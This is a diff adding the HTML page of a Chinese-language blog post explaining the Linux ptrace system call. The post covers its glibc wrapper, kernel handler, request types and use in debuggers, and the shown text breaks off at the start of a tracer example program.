@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Linux 系统调用 - ptrace ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的核心 image 的功能  其基本原理是：  当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程 子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED 父进程收到信号后，就可以对停止下来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux ptrace-原理和运用">
+<meta property="og:url" content="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="Linux 系统调用 - ptrace ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的核心 image 的功能  其基本原理是：  当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程 子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED 父进程收到信号后，就可以对停止下来">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/1667297539745.png">
+<meta property="article:published_time" content="2022-11-01T14:35:49.000Z">
+<meta property="article:modified_time" content="2022-11-01T14:39:27.792Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/1667297539745.png">
+
+<link rel="canonical" href="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Linux ptrace-原理和运用 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux ptrace-原理和运用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-01 22:35:49 / Modified: 22:39:27" itemprop="dateCreated datePublished" datetime="2022-11-01T22:35:49+08:00">2022-11-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>11 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>Linux 系统调用 - ptrace</strong></p>
+<p>ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的核心 image 的功能 </p>
+<p>其基本原理是：</p>
+<ul>
+<li>当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程</li>
+<li>子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED</li>
+<li>父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行 </li>
+</ul>
+<p>ptrace 在用户态的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request request, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> res, ret;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  <span class="keyword">void</span> *addr, *data;</span><br><span class="line"></span><br><span class="line">  va_start (ap, request);</span><br><span class="line">  pid = va_arg (ap, <span class="keyword">pid_t</span>);</span><br><span class="line">  addr = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  data = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    data = &amp;ret;</span><br><span class="line"></span><br><span class="line">  res = INLINE_SYSCALL (ptrace, <span class="number">4</span>, request, pid, addr, data);</span><br><span class="line">  <span class="keyword">if</span> (res &gt;= <span class="number">0</span> &amp;&amp; request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于不同的 ptrace 命令有着不同的参数，简化版本如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;   </span><br></pre></td></tr></table></figure>
+<ul>
+<li>enum __ptrace_request request：指示了 ptrace 要执行的命令</li>
+<li>pid_t pid：指示 ptrace 要跟踪的进程ID</li>
+<li>void *addr：指示要监控的内存地址</li>
+<li>void *data：存放读取出的或者要写入的数据</li>
+</ul>
+<p>ptrace 在内核中的接口如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">unsigned</span> <span class="keyword">long</span>, addr,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">		ret = ptrace_traceme();</span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(current);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	child = find_get_task_by_vpid(pid);</span><br><span class="line">	<span class="keyword">if</span> (!child) &#123;</span><br><span class="line">		ret = -ESRCH;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_ATTACH || request == PTRACE_SEIZE) &#123;</span><br><span class="line">		ret = ptrace_attach(child, request, addr, data);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Some architectures need to do book-keeping after</span></span><br><span class="line"><span class="comment">		 * a ptrace attach.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(child);</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = ptrace_check_attach(child, request == PTRACE_KILL ||</span><br><span class="line">				  request == PTRACE_INTERRUPT);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"></span><br><span class="line">	ret = arch_ptrace(child, request, addr, data);</span><br><span class="line">	<span class="keyword">if</span> (ret || request != PTRACE_DETACH)</span><br><span class="line">		ptrace_unfreeze_traced(child);</span><br><span class="line"></span><br><span class="line"> out_put_task_struct:</span><br><span class="line">	put_task_struct(child);</span><br><span class="line"> out:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中对 PTRACE_TRACEME 和 PTRACE_ATTACH 做了特殊处理</li>
+</ul>
+<p>常见 ptrace 命令如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">  PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_TRACE_ME PTRACE_TRACEME</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_I PTRACE_PEEKTEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_D PTRACE_PEEKDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">  PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_U PTRACE_PEEKUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_I PTRACE_POKETEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_D PTRACE_POKEDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">  PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_U PTRACE_POKEUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">  PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_CONTINUE PTRACE_CONT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">  PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_KILL PTRACE_KILL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">  PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_STEP PTRACE_SINGLESTEP</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">  PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ATTACH PTRACE_ATTACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">  PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DETACH PTRACE_DETACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">  PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SYSCALL PTRACE_SYSCALL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">  PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETOPTIONS PTRACE_SETOPTIONS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">  PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETEVENTMSG PTRACE_GETEVENTMSG</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETSIGINFO PTRACE_GETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETSIGINFO PTRACE_SETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">  PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETREGSET PTRACE_GETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">  PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETREGSET PTRACE_SETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">  PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SEIZE PTRACE_SEIZE</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">  PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_INTERRUPT PTRACE_INTERRUPT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">  PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_LISTEN PTRACE_LISTEN</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">  PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_PEEKSIGINFO PTRACE_PEEKSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETSIGMASK PTRACE_GETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETSIGMASK PTRACE_SETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_FILTER PTRACE_SECCOMP_GET_FILTER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_METADATA PTRACE_SECCOMP_GET_METADATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">  PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GET_SYSCALL_INFO PTRACE_GET_SYSCALL_INFO</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>ptrace 的使用 - 调试</strong></p>
+<p>Linux 调试工具 GDB 的底层就是使用了 ptrace，主要是 PTRACE_ATTACH 功能</p>
+<p>在使用 ptrace 之前需要在两个进程间建立追踪关系：（追踪者 tracer 和被追踪者 tracee）</p>
+<ul>
+<li>ptrace 编程的主要部分是 tracer，它可以通过附着的方式与 tracee 建立追踪关系</li>
+<li>建立之后，可以控制 tracee 在特定的时候暂停并向 tracer 发送相应信号，而 tracer 则通过循环等待 waitpid 来处理 tracee 发来的信号</li>
+</ul>
+<p>其中会用到4个 ptrace 命令：</p>
+<ul>
+<li>PTRACE_TRACEME：tracee 表明自己想要被追踪，这会自动与父进程建立追踪关系（这也是唯一能被 tracee 使用的 request，其他的 request 都由 tracer 指定）</li>
+<li>PTRACE_PEEKUSER：返回进程用户区域中，偏移为ADDR处，一字大小的数据，使用 <code>ORIG_RAX</code> 计算 <code>RAX</code> 的偏移，从而获取将要执行的系统调用号</li>
+<li>PTRACE_GETREGS：获取寄存器内容，用结构体 <code>user_regs_struct</code> 进行保存</li>
+<li>PTRACE_SYSCALL：在子进程进入和退出系统调用时都将其暂停</li>
+</ul>
+<p>使用 ptrace 的编程案例如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 